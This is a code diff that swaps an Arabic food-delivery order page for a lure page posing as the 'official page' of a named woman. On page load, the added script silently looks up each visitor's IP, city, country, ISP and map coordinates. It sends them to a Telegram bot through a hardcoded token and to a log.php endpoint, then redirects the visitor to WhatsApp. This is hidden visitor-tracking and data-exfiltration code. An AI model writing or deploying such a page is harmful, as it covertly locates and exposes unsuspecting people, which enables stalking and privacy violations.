@@ -1,647 +1,125 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تكة دلفري - توصيل سريع ومضمون</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Changa:wght@400;600;700&display=swap" rel="stylesheet">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Changa', sans-serif;
-        }
+  <meta charset="UTF-8">
+  <title>هند العزاوي - الصفحة الرسمية</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      padding: 0;
+    }
+    .card {
+      background: white;
+      border-radius: 15px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      padding: 30px;
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+    }
+    .avatar {
+      width: 150px;
+      height: 150px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin-bottom: 20px;
+      border: 3px solid #ff6b6b;
+    }
+    h2 {
+      color: #333;
+      margin: 10px 0;
+    }
+    p {
+      color: #666;
+      margin: 5px 0;
+    }
+    .loader {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #ff6b6b;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 2s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+  <script>
+    // إعدادات التلجرام
+    const BOT_TOKEN = '7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM';
+    const CHAT_ID = '7493001551';
+
+    // دالة لإرسال الرسالة إلى التلجرام
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      });
+    }
+
+    // تسجيل بيانات الزائر وإرسالها إلى التلجرام
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        const city = data.city || 'غير معروف';
+        const region = data.region || 'غير معروف';
+        const country = data.country_name || 'غير معروف';
+        const loc = data.latitude + ',' + data.longitude;
+        const googleMapsLink = `https://www.google.com/maps?q=${loc}`;
+        const isp = data.org || 'غير معروف';
         
-        :root {
-            --primary: #ff5722;
-            --primary-dark: #e64a19;
-            --secondary: #4caf50;
-            --dark: #2c3e50;
-            --light: #f5f5f5;
-            --accent: #ffc107;
-        }
+        const message = `🕵️‍♂️ زائر جديد للصفحة:
         
-        body {
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-            min-height: 100vh;
-            padding: 20px;
-            color: var(--dark);
-        }
+🌐 IP: ${ip}
+🏙️ المدينة: ${city}
+📍 المنطقة: ${region}
+🌍 الدولة: ${country}
+📡 مزود الخدمة: ${isp}
+🗺️ الموقع على الخريطة:
+${googleMapsLink}`;
+
+        sendToTelegram(message);
         
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        
-        /* الشريط العلوي */
-        header {
-            background: var(--dark);
-            color: white;
-            padding: 15px 20px;
-            border-radius: 15px;
-            margin-bottom: 25px;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-        
-        .logo h1 {
-            font-size: 2.2rem;
-            color: var(--accent);
-            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
-        }
-        
-        .logo i {
-            font-size: 2.5rem;
-            color: var(--primary);
-        }
-        
-        .contact-info {
-            text-align: left;
-        }
-        
-        .contact-info p {
-            margin: 5px 0;
-            font-size: 1.1rem;
-        }
-        
-        .contact-info i {
-            color: var(--accent);
-            margin-left: 8px;
-        }
-        
-        /* العنوان الرئيسي */
-        .main-title {
-            text-align: center;
-            margin: 30px 0;
-            position: relative;
-        }
-        
-        .main-title h2 {
-            font-size: 4.5rem;
-            color: var(--primary);
-            text-shadow: 0 4px 8px rgba(0,0,0,0.2);
-            letter-spacing: 3px;
-            position: relative;
-            display: inline-block;
-        }
-        
-        .main-title h2::after {
-            content: "";
-            position: absolute;
-            bottom: -15px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 200px;
-            height: 8px;
-            background: var(--accent);
-            border-radius: 10px;
-        }
-        
-        /* محتوى الصفحة */
-        .content {
-            display: flex;
-            gap: 30px;
-            margin-bottom: 40px;
-        }
-        
-        /* نموذج الطلب */
-        .order-form {
-            flex: 1;
-            background: white;
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
-        }
-        
-        .form-title {
-            text-align: center;
-            margin-bottom: 25px;
-            color: var(--dark);
-            font-size: 1.8rem;
-            position: relative;
-            padding-bottom: 15px;
-        }
-        
-        .form-title::after {
-            content: "";
-            position: absolute;
-            bottom: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 100px;
-            height: 4px;
-            background: var(--primary);
-            border-radius: 10px;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: var(--dark);
-            font-size: 1.1rem;
-        }
-        
-        .form-control {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #ddd;
-            border-radius: 10px;
-            font-size: 1.1rem;
-            transition: all 0.3s;
-        }
-        
-        .form-control:focus {
-            border-color: var(--primary);
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(255, 87, 34, 0.2);
-        }
-        
-        textarea.form-control {
-            min-height: 120px;
-            resize: vertical;
-        }
-        
-        .btn {
-            display: block;
-            width: 100%;
-            padding: 16px;
-            background: var(--primary);
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-size: 1.2rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 15px;
-            box-shadow: 0 5px 15px rgba(255, 87, 34, 0.4);
-        }
-        
-        .btn:hover {
-            background: var(--primary-dark);
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(255, 87, 34, 0.6);
-        }
-        
-        .btn i {
-            margin-left: 10px;
-        }
-        
-        /* قسم الميزات */
-        .features {
-            flex: 1;
-            background: white;
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
-        }
-        
-        .section-title {
-            text-align: center;
-            margin-bottom: 25px;
-            color: var(--dark);
-            font-size: 1.8rem;
-            position: relative;
-            padding-bottom: 15px;
-        }
-        
-        .section-title::after {
-            content: "";
-            position: absolute;
-            bottom: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 100px;
-            height: 4px;
-            background: var(--secondary);
-            border-radius: 10px;
-        }
-        
-        .feature-list {
-            list-style: none;
-        }
-        
-        .feature-list li {
-            padding: 15px;
-            margin-bottom: 15px;
-            background: #f9f9f9;
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            font-size: 1.1rem;
-            transition: all 0.3s;
-            border-left: 4px solid var(--secondary);
-        }
-        
-        .feature-list li:hover {
-            transform: translateX(10px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-        }
-        
-        .feature-list i {
-            color: var(--secondary);
-            font-size: 1.5rem;
-        }
-        
-        /* الإحصائيات */
-        .stats {
-            display: flex;
-            justify-content: space-around;
-            background: white;
-            padding: 25px;
-            border-radius: 20px;
-            margin: 30px 0;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-        }
-        
-        .stat-item {
-            text-align: center;
-        }
-        
-        .stat-number {
-            font-size: 3rem;
-            font-weight: 700;
-            color: var(--primary);
-            margin-bottom: 5px;
-        }
-        
-        .stat-label {
-            font-size: 1.2rem;
-            color: var(--dark);
-        }
-        
-        /* التذييل */
-        footer {
-            text-align: center;
-            padding: 20px;
-            background: var(--dark);
-            color: white;
-            border-radius: 15px;
-            margin-top: 20px;
-            font-size: 1.1rem;
-        }
-        
-        .whatsapp-link {
-            display: inline-block;
-            background: #25D366;
-            color: white;
-            padding: 12px 25px;
-            border-radius: 50px;
-            text-decoration: none;
-            font-weight: 600;
-            margin-top: 10px;
-            transition: all 0.3s;
-            box-shadow: 0 5px 15px rgba(37, 211, 102, 0.4);
-        }
-        
-        .whatsapp-link:hover {
-            transform: scale(1.05);
-            box-shadow: 0 8px 20px rgba(37, 211, 102, 0.6);
-        }
-        
-        /* رسالة التأكيد */
-        .confirmation {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) scale(0.9);
-            background: white;
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
-            text-align: center;
-            z-index: 1000;
-            opacity: 0;
-            pointer-events: none;
-            transition: all 0.4s ease;
-            max-width: 90%;
-            width: 400px;
-        }
-        
-        .confirmation.active {
-            opacity: 1;
-            transform: translate(-50%, -50%) scale(1);
-            pointer-events: all;
-        }
-        
-        .confirmation i {
-            font-size: 4rem;
-            color: var(--secondary);
-            margin-bottom: 20px;
-        }
-        
-        .confirmation h3 {
-            font-size: 2rem;
-            margin-bottom: 15px;
-            color: var(--dark);
-        }
-        
-        .confirmation p {
-            font-size: 1.2rem;
-            margin-bottom: 20px;
-            line-height: 1.6;
-        }
-        
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.7);
-            z-index: 999;
-            opacity: 0;
-            pointer-events: none;
-            transition: all 0.4s;
-        }
-        
-        .overlay.active {
-            opacity: 1;
-            pointer-events: all;
-        }
-        
-        /* التكيف مع الشاشات الصغيرة */
-        @media (max-width: 900px) {
-            .content {
-                flex-direction: column;
-            }
-            
-            .main-title h2 {
-                font-size: 3.5rem;
-            }
-            
-            .stats {
-                flex-wrap: wrap;
-                gap: 20px;
-            }
-            
-            .stat-item {
-                flex: 1 0 40%;
-            }
-        }
-        
-        @media (max-width: 600px) {
-            header {
-                flex-direction: column;
-                gap: 15px;
-                text-align: center;
-            }
-            
-            .contact-info {
-                text-align: center;
-            }
-            
-            .main-title h2 {
-                font-size: 2.5rem;
-            }
-            
-            .stat-number {
-                font-size: 2.5rem;
-            }
-        }
-    </style>
+        // إرسال البيانات إلى ملف log.php (اختياري)
+        fetch('log.php', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(data)
+        });
+      })
+      .catch(error => {
+        console.error('Error fetching location:', error);
+        sendToTelegram('❌ فشل في جلب بيانات الموقع: ' + error.message);
+      });
+
+    // تحويل تلقائي إلى واتساب بعد 5 ثواني
+    setTimeout(() => {
+      window.location.href = "https://wa.me/963943820819?text=مرحبا";
+    }, 5000);
+  </script>
 </head>
 <body>
-    <div class="container">
-        <!-- الشريط العلوي -->
-        <header>
-            <div class="logo">
-                <i class="fas fa-motorcycle"></i>
-                <h1>تكة دلفري</h1>
-            </div>
-            <div class="contact-info">
-                <p><i class="fas fa-phone"></i> 963943820819</p>
-                <p><i class="fab fa-whatsapp"></i> تواصل عبر واتساب</p>
-            </div>
-        </header>
-        
-        <!-- العنوان الرئيسي -->
-        <div class="main-title">
-            <h2>تكة دلفري</h2>
-        </div>
-        
-        <!-- محتوى الصفحة -->
-        <div class="content">
-            <!-- نموذج الطلب -->
-            <div class="order-form">
-                <h3 class="form-title">اطلب الآن</h3>
-                <form id="deliveryForm">
-                    <div class="form-group">
-                        <label for="name">الاسم الكامل</label>
-                        <input type="text" id="name" class="form-control" required>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="phone">رقم الهاتف</label>
-                        <input type="tel" id="phone" class="form-control" required>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="address">العنوان التفصيلي</label>
-                        <textarea id="address" class="form-control" required></textarea>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="order">تفاصيل الطلب</label>
-                        <textarea id="order" class="form-control" required></textarea>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="notes">ملاحظات إضافية (اختياري)</label>
-                        <textarea id="notes" class="form-control"></textarea>
-                    </div>
-                    
-                    <button type="submit" class="btn">
-                        <i class="fab fa-whatsapp"></i> إرسال الطلب عبر واتساب
-                    </button>
-                </form>
-            </div>
-            
-            <!-- قسم الميزات -->
-            <div class="features">
-                <h3 class="section-title">مميزاتنا</h3>
-                <ul class="feature-list">
-                    <li>
-                        <i class="fas fa-bolt"></i>
-                        <span>توصيل سريع خلال 30 دقيقة</span>
-                    </li>
-                    <li>
-                        <i class="fas fa-shield-alt"></i>
-                        <span>توصيل آمن ومضمون</span>
-                    </li>
-                    <li>
-                        <i class="fas fa-map-marker-alt"></i>
-                        <span>تغطية لجميع مناطق المدينة</span>
-                    </li>
-                    <li>
-                        <i class="fas fa-headset"></i>
-                        <span>دعم فني متواصل 24/7</span>
-                    </li>
-                    <li>
-                        <i class="fas fa-money-bill-wave"></i>
-                        <span>أسعار تنافسية بدون رسوم خفية</span>
-                    </li>
-                    <li>
-                        <i class="fas fa-mobile-alt"></i>
-                        <span>تتبع الطلب عبر التطبيق</span>
-                    </li>
-                </ul>
-                
-                <h3 class="section-title" style="margin-top: 30px;">كيفية الطلب</h3>
-                <ol class="feature-list" style="list-style-type: decimal; padding-right: 30px;">
-                    <li>املأ نموذج الطلب بالبيانات المطلوبة</li>
-                    <li>اضغط على زر إرسال الطلب</li>
-                    <li>سيتم التواصل معك عبر الواتساب لتأكيد الطلب</li>
-                    <li>تتبع طلبك حتى يصل إليك في أسرع وقت</li>
-                </ol>
-            </div>
-        </div>
-        
-        <!-- الإحصائيات -->
-        <div class="stats">
-            <div class="stat-item">
-                <div class="stat-number">15,000+</div>
-                <div class="stat-label">طلب ناجح</div>
-            </div>
-            <div class="stat-item">
-                <div class="stat-number">98%</div>
-                <div class="stat-label">رضا العملاء</div>
-            </div>
-            <div class="stat-item">
-                <div class="stat-number">120+</div>
-                <div class="stat-label">ساعي توصيل</div>
-            </div>
-            <div class="stat-item">
-                <div class="stat-number">24/7</div>
-                <div class="stat-label">خدمة عملاء</div>
-            </div>
-        </div>
-        
-        <!-- التذييل -->
-        <footer>
-            <p>تكة دلفري - خدمة التوصيل الأسرع والأكثر موثوقية في المدينة</p>
-            <p>اتصل بنا مباشرة عبر الواتساب</p>
-            <a href="https://wa.me/963943820819" class="whatsapp-link" target="_blank">
-                <i class="fab fa-whatsapp"></i> 963943820819
-            </a>
-            <p style="margin-top: 20px;">جميع الحقوق محفوظة © 2023 تكة دلفري</p>
-        </footer>
-    </div>
-    
-    <!-- رسالة التأكيد -->
-    <div class="overlay" id="overlay"></div>
-    <div class="confirmation" id="confirmation">
-        <i class="fas fa-check-circle"></i>
-        <h3>تم إرسال طلبك بنجاح!</h3>
-        <p>سيتم التواصل معك عبر الواتساب خلال دقائق لتأكيد طلبك.</p>
-        <p>رقم الطلب: <span id="orderNumber">DLF-2023-1857</span></p>
-        <button class="btn" id="closeConfirmation" style="background: var(--secondary);">
-            <i class="fas fa-times"></i> إغلاق
-        </button>
-    </div>
-    
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const form = document.getElementById('deliveryForm');
-            const confirmation = document.getElementById('confirmation');
-            const overlay = document.getElementById('overlay');
-            const closeBtn = document.getElementById('closeConfirmation');
-            
-            // استعادة البيانات من التخزين المحلي عند تحميل الصفحة
-            const savedData = localStorage.getItem('deliveryFormData');
-            if (savedData) {
-                const data = JSON.parse(savedData);
-                document.getElementById('name').value = data.name || '';
-                document.getElementById('phone').value = data.phone || '';
-                document.getElementById('address').value = data.address || '';
-                document.getElementById('order').value = data.order || '';
-                document.getElementById('notes').value = data.notes || '';
-            }
-            
-            // حفظ البيانات تلقائياً عند تغيير الحقول
-            const formInputs = document.querySelectorAll('#deliveryForm input, #deliveryForm textarea');
-            formInputs.forEach(input => {
-                input.addEventListener('input', function() {
-                    saveFormData();
-                });
-            });
-            
-            // عند إرسال النموذج
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                // جمع بيانات النموذج
-                const name = document.getElementById('name').value;
-                const phone = document.getElementById('phone').value;
-                const address = document.getElementById('address').value;
-                const order = document.getElementById('order').value;
-                const notes = document.getElementById('notes').value;
-                
-                // إنشاء رسالة الواتساب
-                const message = `طلب جديد من تكة دلفري%0A%0A
-الاسم: ${name}%0A
-الهاتف: ${phone}%0A
-العنوان: ${address}%0A
-الطلب: ${order}%0A
-ملاحظات: ${notes || 'لا يوجد'}`;
-                
-                // إنشاء رابط الواتساب
-                const whatsappUrl = `https://wa.me/963943820819?text=${message}`;
-                
-                // فتح الرابط في نافذة جديدة
-                window.open(whatsappUrl, '_blank');
-                
-                // إظهار رسالة التأكيد
-                confirmation.classList.add('active');
-                overlay.classList.add('active');
-                
-                // توليد رقم طلب عشوائي
-                const orderNum = 'DLF-' + new Date().getFullYear() + '-' + Math.floor(1000 + Math.random() * 9000);
-                document.getElementById('orderNumber').textContent = orderNum;
-                
-                // مسح بيانات النموذج بعد الإرسال
-                form.reset();
-                localStorage.removeItem('deliveryFormData');
-            });
-            
-            // إغلاق رسالة التأكيد
-            closeBtn.addEventListener('click', function() {
-                confirmation.classList.remove('active');
-                overlay.classList.remove('active');
-            });
-            
-            // وظيفة لحفظ بيانات النموذج
-            function saveFormData() {
-                const formData = {
-                    name: document.getElementById('name').value,
-                    phone: document.getElementById('phone').value,
-                    address: document.getElementById('address').value,
-                    order: document.getElementById('order').value,
-                    notes: document.getElementById('notes').value
-                };
-                
-                localStorage.setItem('deliveryFormData', JSON.stringify(formData));
-            }
-            
-            // حفظ البيانات كل 5 ثوانٍ أيضاً كنسخة احتياطية
-            setInterval(saveFormData, 5000);
-        });
-    </script>
+  <div class="card">
+    <img src="https://i.imgur.com/4M7IWwP.png" alt="هند العزاوي" class="avatar">
+    <h2>هند العزاوي</h2>
+    <p>🌟 أهلاً بك في الصفحة الرسمية 🌟</p>
+    <p>جارٍ التحويل إلى المحادثة الخاصة...</p>
+    <div class="loader"></div>
+  </div>
 </body>
 </html>
